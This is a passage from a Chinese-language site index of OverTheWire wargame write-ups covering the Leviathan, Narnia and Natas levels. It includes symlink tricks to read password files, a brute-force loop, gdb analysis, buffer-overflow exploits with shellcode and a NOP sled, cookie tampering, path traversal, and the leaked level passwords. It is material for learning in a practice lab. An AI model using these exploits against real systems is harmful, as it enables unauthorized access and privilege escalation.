\"/tmp/chicken/tmp;sh\" /bin/cat: /tmp/chicken/tmp: No such file or directory $ cat /etc/leviathan_pass/leviathan3 Ahdiemoo1j # \u89e3\u6cd5\u4e8c\uff1a\u5229\u7528 cat \u67e5\u770b\u591a\u4e2a\u6587\u4ef6 + \u7b26\u53f7\u94fe\u63a5 $ touch /tmp/chicken/fi $ touch \"/tmp/chicken/fi le\" $ ln -s /etc/leviathan_pass/leviathan3 /tmp/chicken/le $ cd /tmp/chicken # access \u5c06 fi le \u770b\u6210\u4e00\u4e2a\u6587\u4ef6\uff0ccat \u5219\u770b\u4f5c\u4e24\u4e2a\u6587\u4ef6 $ ~/printfile \"fi le\" Ahdiemoo1j $ cd $ rm -r /tmp/chicken","title":"Level 2"},{"location":"wargames/leviathan/#_1","text":"access(2) \u2014 Linux manual page","title":"\u53c2\u8003\u8d44\u6599"},{"location":"wargames/leviathan/#level-3","text":"Username leviathan3 Password Ahdiemoo1j 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 $ ssh leviathan3@leviathan.labs.overthewire.org -p 2223 $ ls -l total 12 -r-sr-x--- 1 leviathan4 leviathan3 10288 Aug 26 2019 level3 $ ltrace ./level3 __libc_start_main ( 0x8048618, 1 , 0xffffd784, 0x80486d0 <unfinished ...> strcmp ( \"h0no33\" , \"kakaka\" ) = -1 printf ( \"Enter the password> \" ) = 20 fgets ( Enter the password> 123 \"123\\n\" , 256 , 0xf7fc55a0 ) = 0xffffd590 strcmp ( \"123\\n\" , \"snlprintf\\n\" ) = -1 puts ( \"bzzzzzzzzap. WRONG\" bzzzzzzzzap. WRONG ) = 19 +++ exited ( status 0 ) +++ $ ./level3 Enter the password> snlprintf [ You ' ve got shell ] ! $ cat /etc/leviathan_pass/leviathan4 vuH0coox6m","title":"Level 3"},{"location":"wargames/leviathan/#level-4","text":"Username leviathan4 Password vuH0coox6m 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 $ ssh leviathan4@leviathan.labs.overthewire.org -p 2223 $ ls -l total 0 $ ls -la total 24 drwxr-xr-x 3 root root 4096 Aug 26 2019 . drwxr-xr-x 10 root root 4096 Aug 26 2019 .. -rw-r--r-- 1 root root 220 May 15 2017 .bash_logout -rw-r--r-- 1 root root 3526 May 15 2017 .bashrc -rw-r--r-- 1 root root 675 May 15 2017 .profile dr-xr-x--- 2 root leviathan4 4096 Aug 26 2019 .trash $ cd .trash/ $ ls -l total 8 -r-sr-x--- 1 leviathan5 leviathan4 7352 Aug 26 2019 bin $ ./bin 01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010 $ ./bin | perl -lape '$_=pack\"(B8)*\",@F' Tith4cokei # -a: autosplit mode with -n or -p (splits $_ into @F) # The array @F contains the fields of each line read in when autosplit mode is turned on","title":"Level 4"},{"location":"wargames/leviathan/#_2","text":"bash - ASCII to Binary and Binary to ASCII conversion tools? - Unix & Linux Stack Exchange","title":"\u53c2\u8003\u8d44\u6599"},{"location":"wargames/leviathan/#level-5","text":"Username leviathan5 Password Tith4cokei 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 $ ssh leviathan5@leviathan.labs.overthewire.org -p 2223 $ ls -l total 8 -r-sr-x--- 1 leviathan6 leviathan5 7560 Aug 26 2019 leviathan5 $ ./leviathan5 Cannot find /tmp/file.log $ ltrace ./leviathan5 __libc_start_main ( 0x80485db, 1 , 0xffffd784, 0x80486a0 <unfinished ...> fopen ( \"/tmp/file.log\" , \"r\" ) = 0 puts ( \"Cannot find /tmp/file.log\" Cannot find /tmp/file.log ) = 26 exit ( -1 <no return ...> +++ exited ( status 255 ) +++ $ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log $ ./leviathan5 UgaoFee4li","title":"Level 5"},{"location":"wargames/leviathan/#level-6","text":"Username leviathan6 Password UgaoFee4li 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 $ ssh leviathan6@leviathan.labs.overthewire.org -p 2223 $ ls -l total 8 -r-sr-x--- 1 leviathan7 leviathan6 7452 Aug 26 2019 leviathan6 $ ./leviathan6 usage: ./leviathan6 < 4 digit code> # Nothing found... $ ltrace ./leviathan6 1234 __libc_start_main ( 0x804853b, 2 , 0xffffd774, 0x80485e0 <unfinished ...> atoi ( 0xffffd8a9, 0 , 0xf7e40890, 0x804862b ) = 1234 puts ( \"Wrong\" Wrong ) = 6 +++ exited ( status 0 ) +++ # \u53ef\u4ee5\u66b4\u529b\u7834\u89e3 $ mkdir /tmp/chicken $ cd /tmp/chicken $ vi brute.sh #!/usr/bin/env bash for i in $( seq -w 0 9999 ) do /home/leviathan6/leviathan6 \" $i \" done $ chmod +x brute.sh $ ./brute.sh # Wait for a while $ whoami leviathan7 $ cat /etc/leviathan_pass/leviathan7 ahy7MaeBo9 $ cd $ rm -r /tmp/chicken \u4e5f\u53ef\u4ee5\u4f7f\u7528 gdb \u8c03\u8bd5 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 $ gdb -q ./leviathan6 Reading symbols from ./leviathan6... ( no debugging symbols found ) ...done. ( gdb ) disas main # \u663e\u793a main \u51fd\u6570\u7684\u6c47\u7f16 Dump of assembler code for function main: 0x0804853b <+0>: lea 0x4 ( %esp ) ,%ecx 0x0804853f <+4>: and $0 xfffffff0,%esp 0x08048542 <+7>: pushl -0x4 ( %ecx ) 0x08048545 <+10>: push %ebp 0x08048546 <+11>: mov %esp,%ebp 0x08048548 <+13>: push %ebx 0x08048549 <+14>: push %ecx 0x0804854a <+15>: sub $0 x10,%esp 0x0804854d <+18>: mov %ecx,%eax 0x0804854f <+20>: movl $0 x1bd3,-0xc ( %ebp ) # \u8fd9\u91cc\u5c06 0x1bd3(7123) \u653e\u5165\u4e86 $ebp-0xc 0x08048556 <+27>: cmpl $0 x2, ( %eax ) 0x08048559 <+30>: je 0x804857b <main+64> ... 0x08048587 <+76>: call 0x8048420 <atoi@plt> ---Type < return > to continue , or q < return > to quit--- 0x0804858c <+81>: add $0 x10,%esp 0x0804858f <+84>: cmp -0xc ( %ebp ) ,%eax # \u8fd9\u91cc\u51fa\u73b0\u4e86\u4e00\u4e2a\u6bd4\u8f83 0x08048592 <+87>: jne 0x80485bf <main+132> ... 0x080485d7 <+156>: pop %ecx 0x080485d8 <+157>: pop %ebx 0x080485d9 <+158>: pop %ebp 0x080485da <+159>: lea -0x4 ( %ecx ) ,%esp 0x080485dd <+162>: ret End of assembler dump. # \u9664\u4e86\u4e0b\u65ad\u70b9\u8fd8\u53ef\u4ee5\u76f4\u63a5\u89c2\u5bdf\u6c47\u7f16\u6e90\u7801 ( gdb ) b *main+84 # \u5c06\u65ad\u70b9\u4e0b\u5728 0x0804858f <+84>: cmp -0xc(%ebp),%eax Breakpoint 1 at 0x804858f ( gdb ) r 1234 Starting program: /home/leviathan6/leviathan6 1234 Breakpoint 1 , 0x0804858f in main () ( gdb ) x /w $ebp -0xc # \u67e5\u770b\u5185\u5b58\u5355\u5143 0xffffd68c: 7123 ( gdb ) c Continuing. Wrong [ Inferior 1 ( process 26843 ) exited normally ] ( gdb ) q $ ./leviathan6 7123 $ whoami leviathan7 $ cat /etc/leviathan_pass/leviathan7 ahy7MaeBo9","title":"Level 6"},{"location":"wargames/narnia/","text":"Level 0 \u00b6 Username narnia0 Password narnia0 1 2 3 4 5 $ ssh narnia0@narnia.labs.overthewire.org -p 2226 $ cd /narnia/ $ ls narnia0 narnia1 narnia2 narnia3 narnia4 narnia5 narnia6 narnia7 narnia8 narnia0.c narnia1.c narnia2.c narnia3.c narnia4.c narnia5.c narnia6.c narnia7.c narnia8.c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 $ cat narnia0.c #include <stdio.h> #include <stdlib.h> int main (){ long val = 0x41414141 ; char buf [ 20 ] ; printf ( \"Correct val's value from 0x41414141 -> 0xdeadbeef!\\n\" ) ; printf ( \"Here is your chance: \" ) ; scanf ( \"%24s\" , & buf ) ; printf ( \"buf: %s\\n\" ,buf ) ; printf ( \"val: 0x%08x\\n\" ,val ) ; if ( val == 0xdeadbeef ){ setreuid ( geteuid () ,geteuid ()) ; system ( \"/bin/sh\" ) ; } else { printf ( \"WAY OFF!!!!\\n\" ) ; exit ( 1 ) ; } return 0 ; } $ ( python3 -c \"import sys; sys.stdout.buffer.write(b'a' * 20 + int.to_bytes(0xdeadbeef, 4, 'little'))\" ; cat ) | ./narnia0 Correct val ' s value from 0x41414141 -> 0xdeadbeef! Here is your chance: buf: aaaaaaaaaaaaaaaaaaaa\uffad\ufffd val: 0xdeadbeef id uid = 14001 ( narnia1 ) gid = 14000 ( narnia0 ) groups = 14000 ( narnia0 ) cat /etc/narnia_pass/narnia1 eaa6AjYMBB Level 1 \u00b6 Username narnia1 Password eaa6AjYMBB 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 $ ssh narnia1@narnia.labs.overthewire.org -p 2226 $ cd /narnia/ $ cat narnia1.c #include <stdio.h> int main (){ int ( *ret )() ; if ( getenv ( \"EGG\" )== NULL ){ printf ( \"Give me something to execute at the env-variable EGG\\n\" ) ; exit ( 1 ) ; } printf ( \"Trying to execute EGG!\\n\" ) ; ret = getenv ( \"EGG\" ) ; ret () ; return 0 ; } # \u53ef\u4ee5\u6267\u884c shellcode # \u53c2\u8003 narnia0 \u9700\u8981\u5148 setreuid(geteuid(), geteuid()) # http://shell-storm.org/shellcode/files/shellcode-399.html $ EGG = ` python3 -c \"import sys; sys.stdout.buffer.write(b'\\x6a\\x31\\x58\\x99\\xcd\\x80\\x89\\xc3\\x89\\xc1\\x6a\\x46\\x58\\xcd\\x80\\xb0\\x0b\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x89\\xd1\\xcd\\x80')\" ` ./narnia1 Trying to execute EGG! $ id uid = 14002 ( narnia2 ) gid = 14001 ( narnia1 ) groups = 14001 ( narnia1 ) $ cat /etc/narnia_pass/narnia2 Zzb6MIyceT $ exit Level 2 \u00b6 Username narnia2 Password Zzb6MIyceT 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 $ ssh narnia2@narnia.labs.overthewire.org -p 2226 $ cd /narnia/ $ cat narnia2.c #include <stdio.h> #include <string.h> #include <stdlib.h> int main ( int argc, char * argv []){ char buf [ 128 ] ; if ( argc == 1 ){ printf ( \"Usage: %s argument\\n\" , argv [ 0 ]) ; exit ( 1 ) ; } strcpy ( buf, argv [ 1 ]) ; printf ( \"%s\" , buf ) ; return 0 ; } # \u786e\u5b9a\u53ef\u4ee5\u63a7\u5236 EIP \u7684\u6ea2\u51fa\u70b9 $ gdb ./narnia2 ( gdb ) break *0x080491e8 # main ret Breakpoint 2 at 0x80491e8 ( gdb ) define hook-stop Type commands for definition of \"hook-stop\" . End with a line saying just \"end\" . >x/1i $eip >x/8wx $esp >end ( gdb ) r ` python3 -c \"print(''.join([chr(i) * 4 for i in range(32, 96)]))\" ` Starting program: /narnia/narnia2 ` python3 -c \"print(''.join([chr(i) * 4 for i in range(32, 96)]))\" ` [ Thread debugging using libthread_db enabled ] Using host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\" . = > 0x80491e8 <main+82>: ret 0xffffd31c: 0x42424242 0x43434343 0x44444444 0x45454545 0xffffd32c: 0x46464646 0x47474747 0x48484848 0x49494949 Breakpoint 1 , 0x080491e8 in main () ( gdb ) c Continuing. Program received signal SIGSEGV, Segmentation fault. = > 0x42424242: Error while running hook_stop: Cannot access memory at address 0x42424242 0x42424242 in ?? () # 0x42 - 32 = 34\uff0cEIP \u5728\u7b2c 34 \u4e2a Exploit \u00b6 1 2 3 4 5 import sys eip = int . to_bytes ( 0xffffd320 + 32 , 4 , 'little' ) # \u786e\u4fdd\u8df3\u8f6c\u5728 NOP \u4e2d nop = b ' \\x90 ' * 96 shellcode = b ' \\x6a\\x31\\x58\\x99\\xcd\\x80\\x89\\xc3\\x89\\xc1\\x6a\\x46\\x58\\xcd\\x80\\xb0\\x0b\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x89\\xd1\\xcd\\x80 ' sys . stdout . buffer . write ( b 'a' * 33 * 4 + eip + nop + shellcode ) 1 2 3 4 5 6 $ /narnia/narnia2 ` python3 narnia2.py ` $ id uid = 14003 ( narnia3 ) gid = 14002 ( narnia2 ) groups = 14002 ( narnia2 ) $ cat /etc/narnia_pass/narnia3 8SyQ2wyEDU $ exit","title":"Narnia"},{"location":"wargames/narnia/#level-0","text":"Username narnia0 Password narnia0 1 2 3 4 5 $ ssh narnia0@narnia.labs.overthewire.org -p 2226 $ cd /narnia/ $ ls narnia0 narnia1 narnia2 narnia3 narnia4 narnia5 narnia6 narnia7 narnia8 narnia0.c narnia1.c narnia2.c narnia3.c narnia4.c narnia5.c narnia6.c narnia7.c narnia8.c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 $ cat narnia0.c #include <stdio.h> #include <stdlib.h> int main (){ long val = 0x41414141 ; char buf [ 20 ] ; printf ( \"Correct val's value from 0x41414141 -> 0xdeadbeef!\\n\" ) ; printf ( \"Here is your chance: \" ) ; scanf ( \"%24s\" , & buf ) ; printf ( \"buf: %s\\n\" ,buf ) ; printf ( \"val: 0x%08x\\n\" ,val ) ; if ( val == 0xdeadbeef ){ setreuid ( geteuid () ,geteuid ()) ; system ( \"/bin/sh\" ) ; } else { printf ( \"WAY OFF!!!!\\n\" ) ; exit ( 1 ) ; } return 0 ; } $ ( python3 -c \"import sys; sys.stdout.buffer.write(b'a' * 20 + int.to_bytes(0xdeadbeef, 4, 'little'))\" ; cat ) | ./narnia0 Correct val ' s value from 0x41414141 -> 0xdeadbeef! Here is your chance: buf: aaaaaaaaaaaaaaaaaaaa\uffad\ufffd val: 0xdeadbeef id uid = 14001 ( narnia1 ) gid = 14000 ( narnia0 ) groups = 14000 ( narnia0 ) cat /etc/narnia_pass/narnia1 eaa6AjYMBB","title":"Level 0"},{"location":"wargames/narnia/#level-1","text":"Username narnia1 Password eaa6AjYMBB 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 $ ssh narnia1@narnia.labs.overthewire.org -p 2226 $ cd /narnia/ $ cat narnia1.c #include <stdio.h> int main (){ int ( *ret )() ; if ( getenv ( \"EGG\" )== NULL ){ printf ( \"Give me something to execute at the env-variable EGG\\n\" ) ; exit ( 1 ) ; } printf ( \"Trying to execute EGG!\\n\" ) ; ret = getenv ( \"EGG\" ) ; ret () ; return 0 ; } # \u53ef\u4ee5\u6267\u884c shellcode # \u53c2\u8003 narnia0 \u9700\u8981\u5148 setreuid(geteuid(), geteuid()) # http://shell-storm.org/shellcode/files/shellcode-399.html $ EGG = ` python3 -c \"import sys; sys.stdout.buffer.write(b'\\x6a\\x31\\x58\\x99\\xcd\\x80\\x89\\xc3\\x89\\xc1\\x6a\\x46\\x58\\xcd\\x80\\xb0\\x0b\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x89\\xd1\\xcd\\x80')\" ` ./narnia1 Trying to execute EGG! $ id uid = 14002 ( narnia2 ) gid = 14001 ( narnia1 ) groups = 14001 ( narnia1 ) $ cat /etc/narnia_pass/narnia2 Zzb6MIyceT $ exit","title":"Level 1"},{"location":"wargames/narnia/#level-2","text":"Username narnia2 Password Zzb6MIyceT 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 $ ssh narnia2@narnia.labs.overthewire.org -p 2226 $ cd /narnia/ $ cat narnia2.c #include <stdio.h> #include <string.h> #include <stdlib.h> int main ( int argc, char * argv []){ char buf [ 128 ] ; if ( argc == 1 ){ printf ( \"Usage: %s argument\\n\" , argv [ 0 ]) ; exit ( 1 ) ; } strcpy ( buf, argv [ 1 ]) ; printf ( \"%s\" , buf ) ; return 0 ; } # \u786e\u5b9a\u53ef\u4ee5\u63a7\u5236 EIP \u7684\u6ea2\u51fa\u70b9 $ gdb ./narnia2 ( gdb ) break *0x080491e8 # main ret Breakpoint 2 at 0x80491e8 ( gdb ) define hook-stop Type commands for definition of \"hook-stop\" . End with a line saying just \"end\" . >x/1i $eip >x/8wx $esp >end ( gdb ) r ` python3 -c \"print(''.join([chr(i) * 4 for i in range(32, 96)]))\" ` Starting program: /narnia/narnia2 ` python3 -c \"print(''.join([chr(i) * 4 for i in range(32, 96)]))\" ` [ Thread debugging using libthread_db enabled ] Using host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\" . = > 0x80491e8 <main+82>: ret 0xffffd31c: 0x42424242 0x43434343 0x44444444 0x45454545 0xffffd32c: 0x46464646 0x47474747 0x48484848 0x49494949 Breakpoint 1 , 0x080491e8 in main () ( gdb ) c Continuing. Program received signal SIGSEGV, Segmentation fault. = > 0x42424242: Error while running hook_stop: Cannot access memory at address 0x42424242 0x42424242 in ?? () # 0x42 - 32 = 34\uff0cEIP \u5728\u7b2c 34 \u4e2a","title":"Level 2"},{"location":"wargames/narnia/#exploit","text":"1 2 3 4 5 import sys eip = int . to_bytes ( 0xffffd320 + 32 , 4 , 'little' ) # \u786e\u4fdd\u8df3\u8f6c\u5728 NOP \u4e2d nop = b ' \\x90 ' * 96 shellcode = b ' \\x6a\\x31\\x58\\x99\\xcd\\x80\\x89\\xc3\\x89\\xc1\\x6a\\x46\\x58\\xcd\\x80\\xb0\\x0b\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x89\\xd1\\xcd\\x80 ' sys . stdout . buffer . write ( b 'a' * 33 * 4 + eip + nop + shellcode ) 1 2 3 4 5 6 $ /narnia/narnia2 ` python3 narnia2.py ` $ id uid = 14003 ( narnia3 ) gid = 14002 ( narnia2 ) groups = 14002 ( narnia2 ) $ cat /etc/narnia_pass/narnia3 8SyQ2wyEDU $ exit","title":"Exploit"},{"location":"wargames/natas/","text":"Level 0 \u00b6 Username natas0 Password natas0 URL http://natas0.natas.labs.overthewire.org \u63d0\u793a\uff1a You can find the password for the next level on this page. \u4f7f\u7528\u5f00\u53d1\u8005\u5de5\u5177\u67e5\u770b\u9875\u9762\u6e90\u4ee3\u7801\u5373\u53ef\u83b7\u5f97\u4e0b\u4e00\u5173\u7684\u53e3\u4ee4 Level 1 \u00b6 Username natas1 Password gtVrDuiDfck831PqWsLEZy5gyDz1clto URL http://natas1.natas.labs.overthewire.org \u63d0\u793a\uff1a You can find the password for the next level on this page, but rightclicking has been blocked! \uff08\u4f46\u662f\u5495\u5495\u51e0\u4e4e\u4e0d\u600e\u4e48\u7528\u53f3\u952e\u67e5\u770b\u9875\u9762\u6e90\u4ee3\u7801\u7684(\u256e\u014f\u03c9\u014f)\u256d\uff09 \u4f7f\u7528\u5f00\u53d1\u8005\u5de5\u5177\u67e5\u770b\u9875\u9762\u6e90\u4ee3\u7801\u5373\u53ef\u83b7\u5f97\u4e0b\u4e00\u5173\u7684\u53e3\u4ee4 Level 2 \u00b6 Username natas2 Password ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi URL http://natas2.natas.labs.overthewire.org \u63d0\u793a\uff1a There is nothing on this page \u67e5\u770b\u9875\u9762\u6e90\u4ee3\u7801\uff0c\u53d1\u73b0\u4f7f\u7528\u4e86\u4e00\u5f20 files \u8def\u5f84\u4e0b\u7684\u56fe\u7247\uff08\u56e0\u4e3a\u53ea\u6709 1X1 \u7684\u5927\u5c0f\uff0c\u6240\u4ee5\u9875\u9762\u4e0a\u770b\u4e0d\u5230\uff09 \u8bbf\u95ee http://natas2.natas.labs.overthewire.org/files \uff0c\u53d1\u73b0\u8be5\u8def\u5f84\u4e0b\u8fd8\u6709\u4e00\u4e2a users.txt \u6587\u4ef6\uff0c\u67e5\u770b\u8be5\u6587\u4ef6\u83b7\u5f97\u7528\u6237 natas3 \u7684\u53e3\u4ee4 1 2 3 4 5 6 7 # username:password alice:BYNdCesZqW bob:jw2ueICLvT charlie:G5vCxkVV3m natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 eve:zo4mJWyNj2 mallory:9urtcpzBmH Level 3 \u00b6 Username natas3 Password sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 URL http://natas3.natas.labs.overthewire.org \u8fd9\u6b21\u9875\u9762\u4e0a\u4f9d\u7136\u662f There is nothing on this page \uff0c\u67e5\u770b\u9875\u9762\u6e90\u4ee3\u7801\uff0c\u53d1\u73b0\u4e00\u6bb5\u6ce8\u91ca\u4fe1\u606f\uff1a No more information leaks!! Not even Google will find it this time... \u55ef\uff1f\u600e\u4e48\u80fd\u8ba9\u8c37\u6b4c\u6293\u53d6\u4e0d\u5230\u7f51\u7ad9\u7684\uff1f \u7f51\u7ad9\u6240\u6709\u8005\u53ef\u4ee5\u8be6\u7ec6\u89c4\u5b9a\u5904\u7406\u5176\u7f51\u9875\u7684\u65b9\u5f0f\uff0c\u7533\u8bf7\u91cd\u65b0\u6293\u53d6\uff0c\u6216\u4f7f\u7528 robots.txt \u6587\u4ef6\u5b8c\u5168\u7981\u6b62\u8c37\u6b4c\u6293\u53d6\u5de5\u5177\u6293\u53d6\u4ed6\u4eec\u7684\u7f51\u7ad9 \u8bbf\u95ee http://natas3.natas.labs.overthewire.org/robots.txt \uff0c\u67e5\u770b robots.txt \u6587\u4ef6 1 2 3 # \u7981\u6b62\u6240\u6709\u722c\u866b\u722c\u53d6\u8def\u5f84 /s3cr3t User-agent: * Disallow: /s3cr3t/ \u76ee\u6807\u6307\u5411 http://natas3.natas.labs.overthewire.org/s3cr3t/ \uff0c\u8bbf\u95ee\u53ef\u67e5\u770b\u5230\u8be5\u8def\u5f84\u4e0b\u7684\u4e00\u4e2a users.txt \u6587\u4ef6\uff0c\u5176\u4e2d\u5305\u542b\u4e0b\u4e00\u5173\u7684\u53e3\u4ee4 1 natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ \u53c2\u8003\u8d44\u6599 \u00b6 Google \u641c\u7d22\u7684\u5de5\u4f5c\u65b9\u5f0f | \u6293\u53d6\u548c\u7f16\u5165\u7d22\u5f15 Robots.txt Specifications | Search for Developers | Google Developers Level 4 \u00b6 Username natas4 Password Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ URL http://natas4.natas.labs.overthewire.org \u8fdb\u5165\u540e\u63d0\u793a \u70b9\u51fb Refresh page \u540e\uff0c\u4ece http://natas4.natas.labs.overthewire.org \u8fdb\u5165 http://natas4.natas.labs.overthewire.org/index.php \uff0c\u4e14\u63d0\u793a\u6587\u672c\u53d1\u751f\u53d8\u5316 \u5728 HTTP \u8bf7\u6c42\u5934\u4e2d\u5305\u542b Referer \u5b57\u6bb5\uff0c\u7528\u4e8e\u6807\u8bc6\u8bbf\u95ee\u6765\u6e90\uff0c\u63d0\u793a\u4fe1\u606f\u4e2d visit from \u7684\u610f\u4e49\u4e0e\u503c\u5747\u4e0e Referer \u5b57\u6bb5\u76f8\u540c\uff0c\u90a3\u4e48\u5c06 Referer \u5b57\u6bb5\u7684\u503c\u6539\u4e3a http://natas5.natas.labs.overthewire.org/ \uff0c\u518d\u6b21\u53d1\u9001 HTTP \u8bf7\u6c42\u5373\u53ef Level 5 \u00b6 Username natas5 Password iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq URL http://natas5.natas.labs.overthewire.org \u8fdb\u5165\u540e\u63d0\u793a\u6ca1\u6709\u767b\u5f55\uff01(\u2565\u03c9\u2565) \u67e5\u770b HTTP \u8bf7\u6c42\u5934\uff0c\u53d1\u73b0 Cookie \u5b57\u6bb5\u4e3a loggedin=0 \uff0c\u975e\u5e38\u53ef\u7591(\u2014\u02cb\u03c9\u02ca\u2014)\uff01 \u5c06 loggedin=0 \u4fee\u6539\u4e3a loggedin=1 \u5e76\u53d1\u9001 HTTP \u8bf7\u6c42\uff0c\u6210\u529f\u767b\u5f55\uff01 Level 6 \u00b6 Username natas6 Password aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 URL http://natas6.natas.labs.overthewire.org \u51fa\u73b0\u8f93\u5165\u6846\u4e86\uff01 \u5148\u770b\u770b\u6e90\u4ee3\u7801 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 < html > < head > <!-- This stuff in the header has nothing to do with the level --> </ head > < body > < h1 > natas6 </ h1 > < div id = \"content\" > <? include \"includes/secret.inc\"; # \u4f7f\u7528\u7684\u662f\u76f8\u5bf9\u8def\u5f84 if(array_key_exists(\"submit\", $_POST)) { # \u9700\u8981\u77e5\u9053 $secret \u7684\u503c if($secret == $_POST['secret']) { print \"Access granted. The password for natas7 is <censored>\"; } else { print \"Wrong secret\"; } } ?> < form method = post > Input secret: < input name = secret >< br > < input type = submit name = submit > </ form > < div id = \"viewsource\" >< a href = \"index-source.html\" > View sourcecode </ a ></ div > </ div > </ body > </ html > \u6ce8\u610f\u5230 include \u6587\u4ef6\u4f7f\u7528\u7684\u662f\u76f8\u5bf9\u8def\u5f84\uff0c\u8bbf\u95ee http://natas6.natas.labs.overthewire.org/includes/secret.inc \uff0c\u5728\u7f51\u9875\u6e90\u4ee3\u7801\u4e2d\u770b\u5230\u53d8\u91cf $secret \u7684\u503c \u56de\u5230 http://natas6.natas.labs.overthewire.org \uff0c\u8f93\u5165\u5bc6\u7801\uff0c\u83b7\u5f97 natas7 \u7684\u53e3\u4ee4 Level 7 \u00b6 Username natas7 Password 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 URL http://natas7.natas.labs.overthewire.org \u9996\u9875\u7ed9\u51fa\u4e86 Home \u548c About \u9875\u9762\u7684\u94fe\u63a5\uff0c\u5e76\u63d0\u793a natas8 \u7684\u53e3\u4ee4\u5b58\u50a8\u5728 /etc/natas_webpass/natas8 \u901a\u8fc7 GET \u65b9\u5f0f\u4f20\u9012\u53c2\u6570\u7ed9 index.php \uff0c\u90a3\u4e48\u9664\u4e86 home \u548c about \uff0c\u968f\u4fbf\u4f20\u4e00\u4e2a\u503c\u8bd5\u8bd5\u53ed(\u2014\u02cb\u03c9\u02ca\u2014) include() \u9996\u5148\u67e5\u770b\u4f20\u5165\u7684\u6587\u4ef6\u8def\u5f84\uff08\u7531\u4e0a\u56fe\u53ef\u77e5\uff0c\u4f20\u5165 include() \u51fd\u6570\u7684\u53c2\u6570\u5373\u4e3a page \u53d8\u91cf\u7684\u503c\uff09\uff0c\u5176\u6b21\u67e5\u770b\u5b9a\u4e49\u7684 include_path \uff0c\u6700\u540e\u68c0\u67e5\u8c03\u7528\u811a\u672c\u6240\u5728\u7684\u76ee\u5f55\u548c\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55\u3002\u90a3\u4e48\u53ef\u901a\u8fc7 page=/etc/natas_webpass/natas8 \u6216 page=../../../../etc/natas_webpass/natas8 \u6765\u83b7\u5f97\u4e0b\u4e00\u5173\u7684\u53e3\u4ee4 \u53c2\u8003\u8d44\u6599 \u00b6 PHP: include - Manual Level 8 \u00b6 Username natas8 Password DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe URL http://natas8.natas.labs.overthewire.org \u518d\u6b21\u51fa\u73b0\u8f93\u5165\u6846\uff0c\u5148\u67e5\u770b\u6e90\u4ee3\u7801 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 < html > < head > <!-- This stuff in the header has nothing to do with the level --> </ head > < body > < h1 > natas8 </ h1 > < div id = \"content\" > <? $encodedSecret = \"3d3d516343746d4d6d6c315669563362\"; function encodeSecret($secret) { return bin2hex(strrev(base64_encode($secret))); } # \u8f93\u5165\u7ecf\u8fc7 Base64 \u7f16\u7801\u3001\u5b57\u7b26\u4e32\u53cd\u8f6c\uff0c\u6700\u540e\u8f6c\u5316\u4e3a\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32 # \u7ed3\u679c\u8981\u4e0e $encodedSecret \u76f8\u7b49 if(array_key_exists(\"submit\", $_POST)) { if(encodeSecret($_POST['secret']) == $encodedSecret) { print \"Access granted. The password for natas9 is <censored>\"; } else { print \"Wrong secret\"; } } ?> < form method = post > Input secret: < input name = secret >< br > < input type = submit name = submit > </ form > < div id = \"viewsource\" >< a href = \"index-source.html\" > View sourcecode </ a ></ div > </ div > </ body > </ html > \u5bf9 $encodedSecret \u8fdb\u884c\u9006\u64cd\u4f5c\uff0c\u4ee5\u5f97\u5230\u8981\u63d0\u4ea4\u7684 secret \u7684\u503c 1 2 $ echo 0x3d3d516343746d4d6d6c315669563362 | xxd -r | rev | base64 -d oubWYf2kBq \u63d0\u4ea4\u5373\u53ef\u83b7\u53d6\u53e3\u4ee4 Level 9 \u00b6 Username natas9 Password W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl URL http://natas9.natas.labs.overthewire.org \u8981\u6c42\u7684\u8f93\u5165\u53d1\u751f\u53d8\u5316\u4e86 